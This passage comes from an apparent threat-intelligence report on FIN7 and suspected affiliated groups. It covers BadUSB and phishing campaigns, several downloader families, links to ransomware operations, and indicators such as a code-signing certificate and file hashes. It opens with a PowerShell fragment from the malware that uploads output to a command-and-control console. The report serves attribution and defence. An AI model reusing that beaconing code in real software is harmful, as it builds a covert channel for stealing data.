{\n\n```\n```\n    $_wc = New-Object System.Net.WebClient\n\n```\n```\n    $_wc.QueryString.Add(\"id\", $script:myID)\n\n```\n```\n    $_wc.Headers.Add(\"Content-type\", \"text/html\")\n\n```\n```\n    $_wc.Headers.Add(\"Accept\", \"text/html\")\n\n```\n```\n    $_rc = $_wc.UploadString($urlConsole, $theAnswer)     \n\n```\n\n-----\n\nMalware code usage is sometimes considered a primary data point for some public threat attribution.\nCode overlaps by themselves, without sufficient additional data points such as intrusion data and\ninfrastructure, are not strong enough for us to fully assess that an UNC group should be merged.\nThroughout 2021 and well into 2022, we have identified and will continue to track multiple newly\nsuspected FIN7 UNCs and their activity moving forward.\n\n## Additional Recent Activity from Suspected FIN7 UNCs\n\n[In October 2021, Mandiant observed a campaign where actors mailed victim organizations “BadUSB”](https://advantage.mandiant.com/reports/21-00022432)\nmalicious USB devices, primarily targeting U.S.-based organizations. We attribute this campaign to\nUNC3319, a group which we suspect to be associated with FIN7 with low confidence.\n\nThe USB hardware was programmed to download STONEBOAT, which ultimately installed the\nDICELOADER framework on the victim system. STONEBOAT is a previously unseen, .NET-based inmemory dropper which decrypts a shellcode payload embedded in it. The payload is then mapped into\nmemory and executed. STONEBOAT was observed first loading an intermediary loader called\n[DAVESHELL, which then executed the final DICELOADER payload. DAVESHELL is publicly available,](https://github.com/monoxgas/sRDI)\nopen-source code for a launcher of embedded payloads. DAVESHELL is used by nearly 30 threat\ngroups including FIN12; however, the implementation of DAVESHELL shellcode loading\nDICELOADER was unique to a small cluster of threat activity.\n\nAdditionally, we’ve identified multiple phishing campaigns distributing BIRDWATCH that have\nleveraged compromised accounts on various email delivery and marketing platforms, including\nMaropost, ActiveCampaign, and Mailjet. We attribute this activity to UNC3381, which is suspected to\nbe FIN7 with low confidence. UNC3381 was first observed in September 2021, but we’ve identified\nsimilar activity leveraging Mailjet dating back to late 2019, suspected to be UNC3381 with high\nconfidence.\n\nThroughout their campaigns, UNC3381 has used nearly identical Quickbooks-themed invoice lures\nand leveraged the branding of the compromised account that they were sent from, providing additional\nlegitimacy for their phishes. These emails contained a malicious link that goes through the analytics\ndomain associated with the platform they were sent from, before redirecting to a page typically hosted\non a compromised domain.\n\n\n-----\n\nFigure 25:\n\nUNC3381 Quickbooks-themed phishing email\nUNC3381 has used multiple malware families in these campaigns, including WINGNIGHT and\nFLYHIGH, two different downloader families which we’ve only observed being used by UNC3381.\nWINGNIGHT is a WSF-based downloader that utilizes VBScript, and FLYHIGH is a downloader written\n[in C using the Excel XLL SDK, but masquerades as using the Excel-DNA framework. In these](https://excel-dna.net/)\ncampaigns, we observed both WINGNIGHT and FLYHIGH leading to BIRDWATCH, often leveraging\nadditional compromised domains for both the download server and the BIRDWATCH C2 controller.\nWe’ve observed limited overlaps between UNC3381 and FIN7 infrastructure as well, including the use\nof the same DNS provider and AS.\n\n## FIN7 and Ransomware\n\n[Mandiant published finished intelligence in 2020 which outlined evidence of FIN7’s possible shift in](https://advantage.mandiant.com/reports/20-00024595)\nmonetization of intrusions from payment card data to extortion operations. Although FIN7’s operations\nhave shifted substantially when compared to their older activity, as of publishing this report, Mandiant\nhas not attributed any direct deployment of ransomware to FIN7. However, the possibility that FIN7\nactors are engaging in ransomware operations is also substantiated by evidence outside of our\nintrusion data holdings and includes code usage, actor infrastructure, and trusted third party sources.\n\nIn at least two incident response engagements in 2020, FIN7 intrusion operations were identified prior\nto ransomware encryption, including the use of MAZE and RYUK. Similarly in 2021, Mandiant\nattributed active FIN7 intrusion activity during an incident response engagement involving ALPHV\nransomware. In all these cases, the ransomware deployment is currently attributed to separately\ntracked threat groups due to factors of the investigation and our visibility.\n\n\n-----\n\nIn addition to evidence produced from intrusion data, secondary artifacts suggest FIN7 played a role in\nat least some DARKSIDE operations. A low global prevalence code signing certificate used by FIN7 in\n2021 to sign BEACON and BEAKDROP samples was also used to sign multiple unattributed\nDARKSIDE samples recovered in the wild (Table 3). The specific mentioned code signing certificate\nused by FIN7 contained the SSL subject common name of “OASIS COURT LIMITED” (Figure 26).\n\nFigure 26: Code signing certificate used by FIN7, also used to sign multiple DARKSIDE ransomware\nsamples\n\nSerial Number:\n\ne4:e7:95:fd:1f:d2:55:95:b8:69:ce:22:aa:7d:c4:9f\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C = GB, ST = Greater Manchester, L = Salford, O = Sectigo Limited, CN = Sectigo RSA\nCode Signing CA\n\nValidity\n\nNot Before: Dec 21 00:00:00 2020 GMT\n\nNot After : Dec 21 23:59:59 2021 GMT\n\nSubject: C = GB, postalCode = CO3 9FA, ST = Essex, L = Colchester, street = 10 Stoneleigh\nPark, O = OASIS COURT LIMITED, CN = OASIS COURT LIMITED\n\nTable 3: Files signed with code certificate\n\n**File MD5** **Note**\n\n`ab29b9e225a05bd17e919e1d0587289e` DNS BEACON\n\n`1c3b19163a3b15b39ae00bbe131b499a` DARKSIDE\n\n`230a681ebbcdba7ae2175f159394d044` DARKSIDE\n\n`bf41fc54f96d0106d34f1c48827006e4` DARKSIDE\n\n`c4da0137cbb99626fd44da707ae1bca8` DARKSIDE\n\n`28e9581ab34297b6e5f817f93281ffac` FIN7 BEACON\n\n`38786bc9de1f447d0187607eaae63f11` FIN7 BEACON\n\n`6fba605c2a02fc62e6ff1fb8e932a935` FIN7 BEAKDROP\n\n\n-----\n\n## Conclusion\n\n[Despite indictments of members of FIN7 in 2018 and a related sentencing in 2021 announced by the](https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100)\nU.S. Department of Justice, at least some members of FIN7 have remained active and continue to\nevolve their criminal operations over time.
